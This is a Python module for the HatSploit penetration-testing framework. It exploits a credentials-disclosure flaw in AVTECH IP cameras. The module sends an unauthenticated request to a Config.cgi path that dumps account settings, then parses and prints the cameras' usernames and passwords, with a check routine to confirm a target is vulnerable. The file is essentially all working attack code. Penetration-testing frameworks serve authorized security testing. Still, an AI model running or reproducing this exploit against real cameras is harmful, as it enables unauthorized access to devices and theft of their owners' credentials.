#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "AVTECH IP Camera Credentials Disclosure",
        'Module': "exploit/linux/avtech/ipcamera_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "AVTECH IP Camera credentials disclosure.",
        'Platform': "linux",
        'Rank': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*'
        )

        creds = []
        usernames = []
        passwords = []

        try:
            for config in response.text.split('\n'):
                variable = config.split('=')[0]
                if len(config.split('=')) >= 2:
                    value = config.split('=')[1]
                    if 'Account.User' in variable:
                        if 'Password' in variable:
                            if value:
                                passwords.append(value)
                        elif 'Username' in variable:
                            if value:
                                usernames.append(value)

            count = len(usernames)
            for index in range(count):
                creds.append((usernames[index], passwords[index]))

            if creds:
                self.print_table("Credentials", ('Username', 'Password'), *creds)
            else:
                self.print_warning("Target vulnerable, but no credentials found.")
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*'
        )

        if not response or response.status_code != 200:
            self.print_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        if not self.check(remote_host, remote_port):
            return

        self.exploit(remote_host, remote_port)
